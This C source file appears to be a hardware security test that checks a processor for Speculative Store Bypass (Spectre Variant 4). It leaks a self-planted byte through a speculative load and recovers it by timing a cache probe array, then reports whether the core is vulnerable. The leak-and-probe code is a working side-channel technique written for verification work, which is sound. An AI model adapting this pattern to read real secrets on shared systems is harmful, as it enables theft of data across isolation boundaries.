/**
 * spec-store-bypass: Speculative Store Bypass (Spectre Variant 4) test.
 *
 * Tests whether a younger load can speculatively bypass an older store
 * to the same address when the store address is not yet resolved, reading
 * a stale value.  The stale value is then used to index a probe array,
 * potentially leaking information through cache timing.
 *
 * This is relevant for store-queue (STQ) forwarding correctness in OoO
 * processors with speculative memory disambiguation.
 */
#include "bench.h"

#define PROBE_ENTRIES 256
#ifndef SECURITY_PROBE_STRIDE
#define SECURITY_PROBE_STRIDE PAGE_SIZE
#endif
#define PROBE_STRIDE  SECURITY_PROBE_STRIDE
#define PROBE_SIZE    (PROBE_ENTRIES * PROBE_STRIDE)

static uint8_t probe_array[PROBE_SIZE]
    __attribute__((aligned(PAGE_SIZE)));

static volatile uint8_t shared_var = 0;

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 100
#endif

int main(void) {
  const uint8_t secret_val = 0x55;

  for (int i = 0; i < PROBE_SIZE; i += PAGE_SIZE)
    probe_array[i] = 0;
  fence();

  /* Baseline */
  uint32_t baseline_hit, baseline_miss;
  {
    volatile uint8_t sink = probe_array[0];
    (void)sink;
    uint32_t t;
    TIMED_ACCESS(&probe_array[0], t);
    baseline_hit = t;
    for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE)
      ((volatile uint8_t *)probe_array)[i];
    fence();
    TIMED_ACCESS(&probe_array[0], t);
    baseline_miss = t;
  }
  uint32_t threshold = baseline_hit * 2;
  if (threshold < 10) threshold = 10;

  report("ssb baseline", baseline_hit, baseline_miss);

  uint32_t scores[PROBE_ENTRIES];
  memset(scores, 0, sizeof(scores));

  for (int round = 0; round < SECURITY_ATTACK_ROUNDS; round++) {
    /* Evict probe */
    for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE)
      ((volatile uint8_t *)probe_array)[i];
    fence();

    /* Write secret, then immediately overwrite with safe value.
       If the CPU speculates the load before the second store completes,
       it may read the secret value. */
    shared_var = secret_val;      // store secret
    fence();                      // try to prevent bypass (mitigation)
    shared_var = 0;               // overwrite with safe value

    /* Load from shared_var: may speculatively see secret_val */
    uint8_t leaked = shared_var;

    /* Use leaked value as index into probe array */
    volatile uint8_t tmp = probe_array[leaked * PROBE_STRIDE];
    (void)tmp;

    fence();

    /* Probe */
    for (int i = 0; i < PROBE_ENTRIES; i++) {
      int idx = ((i * 167) + 13) % PROBE_ENTRIES;
      uint32_t t;
      TIMED_ACCESS(&probe_array[idx * PROBE_STRIDE], t);
      if (t <= threshold)
        scores[idx]++;
    }
  }

  uint32_t max_score = 0;
  int detected_byte = -1;
  for (int i = 1; i < PROBE_ENTRIES; i++) {
    if (scores[i] > max_score) {
      max_score = scores[i];
      detected_byte = i;
    }
  }

  printf("[spec-store-bypass] secret = 0x%02x, detected = 0x%02x, "
         "score = %u/%u\n",
         secret_val, detected_byte >= 0 ? detected_byte : 0,
         max_score, (uint32_t)SECURITY_ATTACK_ROUNDS);

  if (detected_byte == secret_val &&
      max_score > SECURITY_ATTACK_ROUNDS / 4) {
    printf("[spec-store-bypass] VULNERABLE: speculative store bypass detected\n");
  } else {
    printf("[spec-store-bypass] NOT VULNERABLE or insufficient signal\n");
  }

  return 0;
}
